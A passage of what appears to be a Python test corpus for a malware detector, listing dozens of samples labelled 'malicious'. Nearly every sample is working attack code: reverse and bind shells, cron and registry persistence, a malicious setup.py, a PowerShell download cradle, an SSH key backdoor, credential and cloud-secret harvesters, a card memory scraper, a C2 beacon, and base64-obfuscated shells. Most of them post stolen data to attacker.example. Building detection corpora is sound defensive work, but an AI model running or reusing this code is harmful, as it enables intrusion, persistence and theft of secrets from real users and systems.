hostname  = os.uname().nodename.encode()
env_dump  = str(dict(list(os.environ.items())[:10])).encode()
payload   = hostname + b"||" + env_dump
exfil_icmp(payload, C2_HOST)
print(f"Exfiltrated {len(payload)} bytes via ICMP to {C2_HOST}")
""",
    ),
    TestCase(
        description="SQL injection dropper via sqlite union attack",
        expected="malicious",
        code="""
import sqlite3
import os

# Simulate a vulnerable application that passes user input to SQL
def vulnerable_search(db_path: str, user_input: str) -> list:
    conn = sqlite3.connect(db_path)
    # VULNERABLE: direct string formatting
    query = f"SELECT username, email FROM users WHERE name = '{user_input}'"
    cur = conn.cursor()
    cur.execute(query)
    results = cur.fetchall()
    conn.close()
    return results

# Attack payload: UNION-based data extraction
INJECTION = "' UNION SELECT sqlite_version(), (SELECT group_concat(username||':'||password) FROM admin_users)--"

# Then write harvested data to disk
def dump_and_exfil(data: str, outfile: str = "/tmp/.dump") -> None:
    with open(outfile, "a") as f:
        f.write(data + "\\n")
    # Stage 2: send to attacker
    os.system(f"curl -s -d @{outfile} http://attacker.example/sqli_dump")

results = vulnerable_search(":memory:", INJECTION)
dump_and_exfil(str(results))
""",
    ),
    TestCase(
        description="FTP credential brute-force",
        expected="malicious",
        code="""
import ftplib

TARGET = "ftp.victim.example"
PORT   = 21
USERS  = ["anonymous", "ftp", "admin", "root", "user", "ftpuser"]
PWDS   = ["", "anonymous", "password", "ftp", "admin", "1234", "pass123"]

hits = []
for user in USERS:
    for pwd in PWDS:
        try:
            ftp = ftplib.FTP()
            ftp.connect(TARGET, PORT, timeout=5)
            ftp.login(user, pwd)
            print(f"[+] VALID: {user}:{pwd}")
            hits.append((user, pwd))
            # List files once logged in
            files = ftp.nlst()
            print(f"    Files: {files[:5]}")
            ftp.quit()
            break
        except ftplib.error_perm:
            pass
        except Exception:
            break

with open("ftp_hits.txt", "w") as f:
    for u, p in hits:
        f.write(f"{TARGET}\t{u}\t{p}\\n")
""",
    ),
    TestCase(
        description="Linux cron persistence dropper",
        expected="malicious",
        code="""
import os
import subprocess
import base64

PAYLOAD_B64 = base64.b64encode(b\"\"\"
import socket, subprocess, os
s = socket.socket()
s.connect(('10.0.0.1', 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
subprocess.call(['/bin/bash', '-i'])
\"\"\").decode()

PAYLOAD_PATH = "/tmp/.cache_updater.py"

with open(PAYLOAD_PATH, "w") as f:
    f.write(f"import base64; exec(base64.b64decode('{PAYLOAD_B64}'))")
os.chmod(PAYLOAD_PATH, 0o755)

# Add to user crontab
cron_line = f"@reboot python3 {PAYLOAD_PATH}\\n"
existing  = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL, text=True)
proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
proc.communicate(existing + cron_line)
print(f"Persistence installed: {PAYLOAD_PATH}")
""",
    ),
    TestCase(
        description="Windows registry Run key persistence",
        expected="malicious",
        code="""
import winreg
import os
import shutil
import sys

PAYLOAD_SRC  = sys.executable  # or __file__
PAYLOAD_NAME = "WindowsHelperService"
APPDATA      = os.environ.get("APPDATA", "C:\\\\Users\\\\Public")
PAYLOAD_DST  = os.path.join(APPDATA, "svchost_helper.exe")

shutil.copy(PAYLOAD_SRC, PAYLOAD_DST)

REG_PATH = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE) as key:
    winreg.SetValueEx(key, PAYLOAD_NAME, 0, winreg.REG_SZ, f'"{PAYLOAD_DST}"')

print(f"[+] Registry persistence set: HKCU\\\\{REG_PATH}\\\\{PAYLOAD_NAME}")
""",
    ),
    TestCase(
        description="PowerShell download cradle via subprocess",
        expected="malicious",
        code="""
import subprocess
import os
import tempfile

PAYLOAD_URL  = "http://attacker.example/implant.ps1"
STAGE_PATH   = os.path.join(tempfile.gettempdir(), "WindowsUpdate.ps1")

# Download payload using PowerShell bypass techniques
ps_download = (
    f"[System.Net.WebClient]::new().DownloadFile('{PAYLOAD_URL}', '{STAGE_PATH}')"
)
subprocess.run(
    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
     "-NonInteractive", "-Command", ps_download],
    capture_output=True,
)

# Execute downloaded payload
subprocess.Popen(
    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
     "-NonInteractive", "-File", STAGE_PATH],
    close_fds=True,
)
""",
    ),
    TestCase(
        description="/etc/passwd reader and exfiltration",
        expected="malicious",
        code="""
import requests
import subprocess

def read_system_users() -> list[dict]:
    users = []
    with open("/etc/passwd") as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) >= 7:
                uid = int(parts[2])
                users.append({
                    "username": parts[0],
                    "uid":      uid,
                    "home":     parts[5],
                    "shell":    parts[6],
                    "has_shell": parts[6] not in ("/bin/false", "/usr/sbin/nologin", ""),
                })
    return users

def read_shadow_hashes() -> dict:
    hashes = {}
    try:
        with open("/etc/shadow") as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) >= 2 and parts[1] not in ("!", "*", ""):
                    hashes[parts[0]] = parts[1]
    except PermissionError:
        pass
    return hashes

users  = read_system_users()
hashes = read_shadow_hashes()
requests.post("http://attacker.example/creds", json={"users": users, "hashes": hashes}, timeout=5)
""",
    ),
    TestCase(
        description=".ssh/authorized_keys backdoor injection",
        expected="malicious",
        code="""
import os
import pathlib

ATTACKER_PUBKEY = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7attacker_fake_pubkey_for_test=="
    " attacker@evil"
)

def inject_ssh_key(pubkey: str) -> bool:
    ssh_dir      = pathlib.Path.home() / ".ssh"
    auth_keys    = ssh_dir / "authorized_keys"

    ssh_dir.mkdir(mode=0o700, parents=True, exist_ok=True)

    existing = auth_keys.read_text() if auth_keys.exists() else ""
    if pubkey not in existing:
        with auth_keys.open("a") as f:
            f.write(f"\\n{pubkey}\\n")
        auth_keys.chmod(0o600)
        return True
    return False

if inject_ssh_key(ATTACKER_PUBKEY):
    print("[+] Backdoor SSH key injected")
else:
    print("[*] Key already present")
""",
    ),
    TestCase(
        description="netcat bind shell via subprocess",
        expected="malicious",
        code="""
import subprocess
import os
import sys

BIND_PORT = 4444

def start_bind_shell(port: int) -> None:
    try:
        # Try ncat first, fall back to nc
        for nc_cmd in [["ncat", "-lvp", str(port), "-e", "/bin/bash"],
                       ["nc",   "-lvp", str(port), "-e", "/bin/bash"]]:
            result = subprocess.Popen(
                nc_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print(f"[+] Bind shell started on :{port} (PID {result.pid})")
            return
    except FileNotFoundError:
        pass

    # Fallback: pure Python bind shell
    import socket, threading
    def handle(conn):
        while True:
            cmd = conn.recv(4096).decode(errors="replace").strip()
            if not cmd:
                break
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            conn.send(out)

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(5)
    print(f"[+] Python bind shell on :{port}")
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle, args=(conn,), daemon=True).start()

start_bind_shell(BIND_PORT)
""",
    ),
    TestCase(
        description="LD_PRELOAD shared library hijack stub",
        expected="malicious",
        code="""
import os
import subprocess
import tempfile

C_PAYLOAD = r\"\"\"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void _init(void) {
    setuid(0); setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &");
}
\"\"\"

def compile_and_inject(target_cmd: list) -> None:
    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as src:
        src.write(C_PAYLOAD)
        src_path = src.name

    lib_path = "/tmp/.libcache.so"
    subprocess.run(
        ["gcc", "-shared", "-fPIC", "-nostartfiles", "-o", lib_path, src_path],
        check=True, capture_output=True,
    )
    os.unlink(src_path)

    env = os.environ.copy()
    env["LD_PRELOAD"] = lib_path
    subprocess.Popen(target_cmd, env=env)
    print(f"[+] Injected LD_PRELOAD={lib_path}")

compile_and_inject(["ls", "/"])
""",
    ),
    TestCase(
        description="Python package supply-chain stub (setup.py)",
        expected="malicious",
        code="""
# Malicious setup.py that exfiltrates environment on pip install
import subprocess
import os
import requests
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstall(install):
    def run(self):
        install.run(self)
        self._exfiltrate()

    def _exfiltrate(self) -> None:
        data = {
            "host": os.uname().nodename,
            "user": os.environ.get("USER", "unknown"),
            "path": os.environ.get("PATH", ""),
            "home": str(os.path.expanduser("~")),
            "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
            "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        }
        try:
            requests.post("http://attacker.example/pip_install", json=data, timeout=3)
        except Exception:
            pass

setup(
    name="totally-legit-util",
    version="1.0.0",
    cmdclass={"install": MaliciousInstall},
)
""",
    ),
    TestCase(
        description="Slack webhook data exfiltration",
        expected="malicious",
        code="""
import os
import json
import platform
import requests

SLACK_WEBHOOK = "https://hooks.slack.com/services/FAKE/FAKE/FakeWebhookTokenHere"

def exfiltrate_via_slack(webhook_url: str) -> None:
    env_secrets = {
        k: v for k, v in os.environ.items()
        if any(kw in k.upper() for kw in ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASS"])
    }

    message = {
        "text": f":warning: *New victim*",
        "attachments": [{
            "color": "danger",
            "fields": [
                {"title": "Host",     "value": platform.node(),  "short": True},
                {"title": "OS",       "value": platform.system(), "short": True},
                {"title": "User",     "value": os.environ.get("USER", "?"), "short": True},
                {"title": "Secrets",  "value": json.dumps(env_secrets)[:500], "short": False},
            ],
        }],
    }
    requests.post(webhook_url, json=message, timeout=5)

exfiltrate_via_slack(SLACK_WEBHOOK)
""",
    ),
    TestCase(
        description="Discord bot as C2 command executor",
        expected="malicious",
        code="""
import discord
import subprocess
import os

TOKEN = "FAKE_DISCORD_BOT_TOKEN_FOR_TESTING_PURPOSES_ONLY"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ALLOWED_CHANNEL = 1234567890  # attacker's channel ID

@client.event
async def on_ready():
    print(f"[+] C2 bot online as {client.user}")

@client.event
async def on_message(message):
    if message.channel.id != ALLOWED_CHANNEL:
        return
    if not message.content.startswith("!exec "):
        return

    cmd = message.content[6:]
    try:
        result = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=15
        )
        output = result.decode(errors="replace")[:1990]
    except subprocess.CalledProcessError as e:
        output = e.output.decode(errors="replace")[:1990]

    await message.channel.send(f"```\\n{output}\\n```")

client.run(TOKEN)
""",
    ),
    TestCase(
        description="raw socket SYN stealth scanner",
        expected="malicious",
        code="""
import socket
import struct
import random

def checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if len(data) % 2:
        s += data[-1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def build_syn(src_ip: str, dst_ip: str, dport: int) -> bytes:
    sport = random.randint(1024, 65535)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    tcp_hdr = struct.pack("!HHIIBBHHH", sport, dport, 0, 0, 0x50, 0x02, 65535, 0, 0)
    return ip_hdr + tcp_hdr

TARGET = "192.168.1.1"
SRC_IP = "192.168.1.200"

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

for port in range(1, 1025):
    s.sendto(build_syn(SRC_IP, TARGET, port), (TARGET, 0))
print(f"SYN scan complete against {TARGET}")
""",
    ),
    TestCase(
        description="SMB share enumeration and credential capture",
        expected="malicious",
        code="""
import subprocess
import re
import requests

TARGETS = ["192.168.1.0/24"]

def enumerate_smb_shares(subnet: str) -> list[dict]:
    result = subprocess.run(
        ["nmap", "-p", "445", "--open", "-oG", "-", subnet],
        capture_output=True, text=True, timeout=60,
    )
    hosts = re.findall(r"(\d+\.\d+\.\d+\.\d+).*Ports: 445/open", result.stdout)

    findings = []
    for host in hosts:
        shares_out = subprocess.run(
            ["smbclient", "-L", host, "-N"],
            capture_output=True, text=True, timeout=10,
        )
        shares = re.findall(r"\\s+(\\S+)\\s+Disk", shares_out.stdout)
        findings.append({"host": host, "shares": shares})

    return findings

findings = enumerate_smb_shares(TARGETS[0])
requests.post("http://attacker.example/smb_recon", json=findings, timeout=5)
""",
    ),
    TestCase(
        description="/proc/net interface scraper for lateral movement",
        expected="malicious",
        code="""
import ipaddress
import struct
import requests

def read_arp_table() -> list[dict]:
    entries = []
    with open("/proc/net/arp") as f:
        next(f)  # skip header
        for line in f:
            parts = line.split()
            if len(parts) >= 4:
                entries.append({"ip": parts[0], "mac": parts[3], "iface": parts[-1]})
    return entries

def read_routes() -> list[dict]:
    routes = []
    with open("/proc/net/route") as f:
        next(f)
        for line in f:
            parts = line.split()
            dest = socket_hex_to_ip(parts[1])
            gw   = socket_hex_to_ip(parts[2])
            routes.append({"dest": dest, "gateway": gw, "iface": parts[0]})
    return routes

def socket_hex_to_ip(hex_str: str) -> str:
    addr = int(hex_str, 16)
    return str(ipaddress.ip_address(struct.pack("<I", addr)))

network_data = {"arp": read_arp_table(), "routes": read_routes()}
requests.post("http://attacker.example/network_recon", json=network_data, timeout=5)
""",
    ),
    TestCase(
        description="Docker socket abuse to escape container",
        expected="malicious",
        code="""
import requests
import json

DOCKER_SOCK = "http+unix://%2Fvar%2Frun%2Fdocker.sock"

def docker_api(method: str, path: str, **kwargs):
    import requests_unixsocket
    session = requests_unixsocket.Session()
    url = f"http+unix://%2Fvar%2Frun%2Fdocker.sock{path}"
    return session.request(method, url, **kwargs)

# List containers to find victim
containers = docker_api("GET", "/containers/json").json()
print(f"Found {len(containers)} containers")

# Create a privileged container mounting host filesystem
payload = {
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /host sh -c 'crontab -l; echo @reboot curl http://attacker.example/sh|sh >> /tmp/cron; crontab /tmp/cron'"],
    "HostConfig": {
        "Binds": ["/:/host"],
        "Privileged": True,
        "NetworkMode": "host",
    },
}
resp = docker_api("POST", "/containers/create", json=payload)
cid = resp.json().get("Id", "")
if cid:
    docker_api("POST", f"/containers/{cid}/start")
    print(f"[+] Escape container started: {cid[:12]}")
""",
    ),
    TestCase(
        description="Git credentials theft from .git-credentials",
        expected="malicious",
        code="""
import os
import pathlib
import re
import requests

def harvest_git_credentials() -> list[dict]:
    credentials = []

    # .git-credentials (plaintext store)
    git_creds = pathlib.Path.home() / ".git-credentials"
    if git_creds.exists():
        for line in git_creds.read_text().splitlines():
            m = re.match(r"https?://([^:]+):([^@]+)@(.+)", line.strip())
            if m:
                credentials.append({
                    "source": "git-credentials",
                    "user":   m.group(1),
                    "pass":   m.group(2),
                    "host":   m.group(3),
                })

    # .netrc
    netrc = pathlib.Path.home() / ".netrc"
    if netrc.exists():
        content = netrc.read_text()
        for machine, login, password in re.findall(
            r"machine\\s+(\\S+)\\s+login\\s+(\\S+)\\s+password\\s+(\\S+)", content
        ):
            credentials.append({"source": "netrc", "host": machine, "user": login, "pass": password})

    return credentials

creds = harvest_git_credentials()
if creds:
    requests.post("http://attacker.example/git_creds", json=creds, timeout=5)
print(f"Harvested {len(creds)} credential entries")
""",
    ),
    TestCase(
        description="browser history stealer (Chrome/Firefox)",
        expected="malicious",
        code="""
import os
import shutil
import sqlite3
import requests
import glob

def steal_chrome_history() -> list[dict]:
    pattern = os.path.expandvars(
        r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\*\\History"
    )
    entries = []
    for db_path in glob.glob(pattern):
        tmp = db_path + ".tmp"
        shutil.copy(db_path, tmp)
        conn = sqlite3.connect(tmp)
        rows = conn.execute(
            "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200"
        ).fetchall()
        conn.close()
        os.unlink(tmp)
        entries.extend({"url": r[0], "title": r[1], "visits": r[2]} for r in rows)
    return entries

def steal_firefox_history() -> list[dict]:
    pattern = os.path.expandvars(r"%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite")
    entries = []
    for db_path in glob.glob(pattern):
        tmp = db_path + ".tmp"
        shutil.copy(db_path, tmp)
        conn = sqlite3.connect(tmp)
        rows = conn.execute("SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 200").fetchall()
        conn.close()
        os.unlink(tmp)
        entries.extend({"url": r[0], "title": r[1], "visits": r[2]} for r in rows)
    return entries

history = steal_chrome_history() + steal_firefox_history()
requests.post("http://attacker.example/history", json=history, timeout=5)
""",
    ),
    TestCase(
        description=".env file harvester across filesystem",
        expected="malicious",
        code="""
import os
import re
import requests
from pathlib import Path

SEARCH_DIRS = [
    Path.home(),
    Path("/var/www"),
    Path("/opt"),
    Path("/srv"),
    Path("/home"),
]
MAX_FILES = 500
SENSITIVE_KEYS = re.compile(
    r"(PASSWORD|PASSWD|SECRET|TOKEN|API[_-]?KEY|PRIVATE|AWS|AZURE|GCP|DATABASE_URL|DB_PASS)",
    re.IGNORECASE,
)

def harvest_env_files() -> list[dict]:
    found = []
    count = 0
    for base_dir in SEARCH_DIRS:
        if not base_dir.exists():
            continue
        for env_file in base_dir.rglob(".env*"):
            if count >= MAX_FILES:
                break
            try:
                content = env_file.read_text(errors="replace")
                secrets = {}
                for line in content.splitlines():
                    if "=" in line and not line.startswith("#"):
                        k, _, v = line.partition("=")
                        if SENSITIVE_KEYS.search(k):
                            secrets[k.strip()] = v.strip()
                if secrets:
                    found.append({"file": str(env_file), "secrets": secrets})
                    count += 1
            except (PermissionError, OSError):
                pass
    return found

secrets = harvest_env_files()
requests.post("http://attacker.example/env_dump", json=secrets, timeout=5)
print(f"Harvested {len(secrets)} .env files")
""",
    ),
    TestCase(
        description="AWS metadata SSRF credential theft",
        expected="malicious",
        code="""
import urllib.request
import json
import requests

METADATA_BASE = "http://169.254.169.254/latest"

def steal_aws_credentials() -> dict:
    # Get IAM role name
    role_url = f"{METADATA_BASE}/meta-data/iam/security-credentials/"
    try:
        with urllib.request.urlopen(role_url, timeout=3) as r:
            role_name = r.read().decode().strip()
    except Exception:
        return {}

    # Get credentials for the role
    creds_url = f"{role_url}{role_name}"
    with urllib.request.urlopen(creds_url, timeout=3) as r:
        creds = json.loads(r.read())

    return {
        "role":        role_name,
        "access_key":  creds.get("AccessKeyId"),
        "secret_key":  creds.get("SecretAccessKey"),
        "token":       creds.get("Token"),
        "expiration":  creds.get("Expiration"),
    }

def get_instance_metadata() -> dict:
    meta = {}
    for key in ["instance-id", "public-ipv4", "local-ipv4", "hostname", "region"]:
        try:
            url = f"{METADATA_BASE}/meta-data/{key}"
            with urllib.request.urlopen(url, timeout=3) as r:
                meta[key] = r.read().decode()
        except Exception:
            pass
    return meta

creds    = steal_aws_credentials()
metadata = get_instance_metadata()
requests.post("http://attacker.example/aws", json={"creds": creds, "meta": metadata}, timeout=5)
""",
    ),
    TestCase(
        description="Kubernetes service account token exfil",
        expected="malicious",
        code="""
import os
import requests

SA_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
SA_CA_PATH    = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
K8S_API       = "https://kubernetes.default.svc"

def exfil_k8s_secrets() -> dict:
    if not os.path.exists(SA_TOKEN_PATH):
        return {"error": "Not running in Kubernetes"}

    token = open(SA_TOKEN_PATH).read().strip()
    headers = {"Authorization": f"Bearer {token}"}

    # Dump secrets from all namespaces
    secrets_url = f"{K8S_API}/api/v1/secrets"
    resp = requests.get(secrets_url, headers=headers, verify=SA_CA_PATH, timeout=10)
    raw_secrets = resp.json().get("items", [])

    import base64
    decoded = []
    for secret in raw_secrets:
        item = {"name": secret.get("metadata", {}).get("name"), "data": {}}
        for k, v in (secret.get("data") or {}).items():
            try:
                item["data"][k] = base64.b64decode(v).decode(errors="replace")
            except Exception:
                item["data"][k] = v
        decoded.append(item)

    return {"token": token, "secrets": decoded}

data = exfil_k8s_secrets()
requests.post("http://attacker.example/k8s_dump", json=data, timeout=5)
""",
    ),
    TestCase(
        description="macro-enabled Office document dropper",
        expected="malicious",
        code="""
import subprocess
import os
import urllib.request
import tempfile

# Simulate VBA macro execution that downloads and runs payload
VBA_MACRO = \"\"\"
Sub AutoOpen()
    Dim url As String
    Dim dest As String
    url  = "http://attacker.example/implant.exe"
    dest = Environ("TEMP") & "\\\\svchelper.exe"
    CreateObject("WScript.Shell").Run "powershell -c (New-Object Net.WebClient).DownloadFile('" & url & "','" & dest & "'); Start-Process '" & dest & "'", 0, False
End Sub
\"\"\"

# Pure Python equivalent (the actual dropper logic)
PAYLOAD_URL = "http://attacker.example/implant.exe"
DEST        = os.path.join(tempfile.gettempdir(), "svchelper.exe")

def download_and_execute(url: str, dest: str) -> None:
    urllib.request.urlretrieve(url, dest)
    os.chmod(dest, 0o755)
    subprocess.Popen([dest], close_fds=True, creationflags=0x00000008)  # DETACHED_PROCESS

download_and_execute(PAYLOAD_URL, DEST)
""",
    ),
    TestCase(
        description="memory scraper for credit card patterns",
        expected="malicious",
        code="""
import re
import psutil
import ctypes
import struct

CC_PATTERN = re.compile(rb"\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b")
AMEX_PATTERN = re.compile(rb"\\b3[47][0-9]{13}\\b")

def read_process_memory(pid: int, address: int, size: int) -> bytes:
    PROCESS_VM_READ = 0x0010
    handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ, False, pid)
    buf    = ctypes.create_string_buffer(size)
    read   = ctypes.c_size_t()
    ctypes.windll.kernel32.ReadProcessMemory(handle, address, buf, size, ctypes.byref(read))
    ctypes.windll.kernel32.CloseHandle(handle)
    return buf.raw[:read.value]

found_cards = set()
for proc in psutil.process_iter(["pid", "name"]):
    try:
        for region in psutil.Process(proc.info["pid"]).memory_maps():
            chunk = read_process_memory(proc.info["pid"], int(region.addr, 16), 4096)
            for match in CC_PATTERN.finditer(chunk):
                found_cards.add(match.group(0).decode())
    except (psutil.AccessDenied, Exception):
        pass

import requests
if found_cards:
    requests.post("http://attacker.example/cards", json=list(found_cards), timeout=5)
""",
    ),
    TestCase(
        description="sudo -l privilege escalation recon",
        expected="malicious",
        code="""
import subprocess
import re
import requests
import os

GTFOBINS = {
    "vim":     "vim -c ':!/bin/bash'",
    "python":  "python -c 'import os; os.system(\"/bin/bash\")'",
    "python3": "python3 -c 'import os; os.system(\"/bin/bash\")'",
    "perl":    "perl -e 'exec \"/bin/bash\";'",
    "find":    "find . -exec /bin/bash \\;",
    "nmap":    "nmap --interactive -e 'os.execute(\"/bin/bash\")'",
    "less":    "less /etc/passwd  # then !bash",
    "awk":     "awk 'BEGIN {system(\"/bin/bash\")}'",
    "env":     "env /bin/bash",
    "tee":     "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd",
}

def check_sudo_privs() -> dict:
    try:
        out = subprocess.check_output(["sudo", "-l"], stderr=subprocess.DEVNULL, text=True)
    except subprocess.CalledProcessError:
        return {"sudo_output": "", "exploits": []}

    exploits = []
    for binary, exploit in GTFOBINS.items():
        if binary in out:
            exploits.append({"binary": binary, "exploit": exploit})

    return {
        "user":       os.environ.get("USER"),
        "sudo_output": out,
        "exploits":   exploits,
    }

result = check_sudo_privs()
requests.post("http://attacker.example/privesc", json=result, timeout=5)
print(f"Found {len(result['exploits'])} potential sudo privesc vectors")
""",
    ),
    TestCase(
        description="GitHub token scanner from local repos",
        expected="malicious",
        code="""
import re
import os
import requests
from pathlib import Path

TOKEN_PATTERNS = {
    "github_pat":  re.compile(r"ghp_[0-9a-zA-Z]{36}"),
    "github_oauth": re.compile(r"gho_[0-9a-zA-Z]{36}"),
    "aws_key":     re.compile(r"AKIA[0-9A-Z]{16}"),
    "aws_secret":  re.compile(r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]"),
    "slack_token": re.compile(r"xox[baprs]-[0-9a-zA-Z\-]{10,72}"),
    "stripe_key":  re.compile(r"sk_live_[0-9a-zA-Z]{24,}"),
    "generic_key": re.compile(r"(?i)(api[_-]?key|token|secret|password)\s*[=:]\s*['\"][^'\"]{10,}['\"]"),
}

def scan_repos(base_dir: Path) -> list[dict]:
    findings = []
    for git_dir in base_dir.rglob(".git"):
        repo_root = git_dir.parent
        for f in repo_root.rglob("*"):
            if f.is_file() and f.suffix in {".py", ".js", ".ts", ".env", ".yaml", ".json", ".sh", ".rb", ".go"}:
                try:
                    text = f.read_text(errors="replace")
                    for pat_name, pattern in TOKEN_PATTERNS.items():
                        for match in pattern.finditer(text):
                            findings.append({"file": str(f), "type": pat_name, "value": match.group()})
                except OSError:
                    pass
    return findings

findings = scan_repos(Path.home())
if findings:
    requests.post("http://attacker.example/tokens", json=findings, timeout=5)
print(f"Found {len(findings)} potential secrets")
""",
    ),
    TestCase(
        description="Python __pycache__ bytecode backdoor injector",
        expected="malicious",
        code="""
import py_compile
import compileall
import os
import importlib.util
import base64

PAYLOAD_SRC = base64.b64decode(
    b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2F0dGFja2VyLmV4YW1wbGUvc2ggfCBiYXNoJyk='
).decode()

TARGET_MODULE = "/usr/lib/python3/dist-packages/urllib/request.py"

def inject_bytecode_backdoor(target: str, payload: str) -> bool:
    try:
        with open(target, "r") as f:
            original = f.read()

        # Prepend payload to target module
        with open(target, "w") as f:
            f.write(payload + "\\n" + original)

        # Recompile to update __pycache__
        py_compile.compile(target, doraise=True)

        # Restore original source (bytecode remains tainted)
        with open(target, "w") as f:
            f.write(original)

        return True
    except PermissionError:
        return False

success = inject_bytecode_backdoor(TARGET_MODULE, PAYLOAD_SRC)
print(f"Bytecode injection: {'success' if success else 'failed (no permission)'}")
""",
    ),
    TestCase(
        description="HTTP C2 beacon with jitter and persistent polling",
        expected="malicious",
        code="""
import os
import time
import random
import subprocess
import requests
import base64
import socket

C2_URL    = "http://attacker.example/beacon"
BEACON_ID = base64.b64encode(socket.gethostname().encode()).decode()
SLEEP_BASE = 30
JITTER     = 0.3

def beacon() -> dict:
    return {
        "id":       BEACON_ID,
        "user":     os.environ.get("USER", "?"),
        "cwd":      os.getcwd(),
        "pid":      os.getpid(),
    }

def execute_task(task: dict) -> str:
    t = task.get("type")
    if t == "shell":
        out = subprocess.check_output(
            task["cmd"], shell=True, stderr=subprocess.STDOUT, timeout=30
        )
        return out.decode(errors="replace")
    elif t == "upload":
        return open(task["path"], "rb").read().hex()
    return "unknown task type"

while True:
    try:
        r = requests.post(C2_URL, json=beacon(), timeout=10)
        if r.status_code == 200 and r.json().get("task"):
            result = execute_task(r.json()["task"])
            requests.post(f"{C2_URL}/result", json={"id": BEACON_ID, "result": result})
    except Exception:
        pass
    sleep_time = SLEEP_BASE * (1 + random.uniform(-JITTER, JITTER))
    time.sleep(sleep_time)
""",
    ),
    TestCase(
        description="SSH known_hosts harvester and lateral movement",
        expected="malicious",
        code="""
import os
import re
import subprocess
import requests
from pathlib import Path

def harvest_known_hosts() -> list[str]:
    hosts = set()
    known = Path.home() / ".ssh" / "known_hosts"
    if known.exists():
        for line in known.read_text().splitlines():
            if line and not line.startswith("#"):
                hosts.add(line.split()[0].split(",")[0])
    return list(hosts)

def try_ssh_lateral(hosts: list[str], privkey: str) -> list[str]:
    compromised = []
    for host in hosts:
        try:
            result = subprocess.run(
                ["ssh", "-i", privkey, "-o", "StrictHostKeyChecking=no",
                 "-o", "ConnectTimeout=5", f"root@{host}",
                 "id && uname -a && cat /etc/shadow 2>/dev/null | head -5"],
                capture_output=True, text=True, timeout=10,
            )
            if result.returncode == 0:
                compromised.append({"host": host, "output": result.stdout})
        except Exception:
            pass
    return compromised

known_hosts = harvest_known_hosts()
key_paths   = list(Path.home().joinpath(".ssh").glob("id_*"))
key_paths   = [str(k) for k in key_paths if not k.suffix == ".pub"]

for key in key_paths:
    results = try_ssh_lateral(known_hosts, key)
    if results:
        requests.post("http://attacker.example/lateral", json=results, timeout=5)
""",
    ),
]


# --------------------------------------------------------------------------
# 30 obfuscated malicious samples
# --------------------------------------------------------------------------

OBFUSCATED_MALICIOUS_SAMPLES: list[TestCase] = [
    TestCase(
        description="obf: exec(base64) reverse shell",
        expected="malicious",
        code="""
import base64
_x = base64.b64decode(
    b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluKDAsMSwyKV07c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'
)
exec(compile(_x, '<c>', 'exec'))
""",
    ),
    TestCase(
        description="obf: chr() concat to reconstruct os.system call",
        expected="malicious",
        code="""
_f = getattr(__builtins__, chr(101)+chr(120)+chr(101)+chr(99))
_c = (
    chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+
    chr(111)+chr(115)+chr(59)+chr(32)+
    chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+
    chr(40)+chr(39)+chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)+chr(39)+chr(41)
)
_f(_c)
""",
    ),
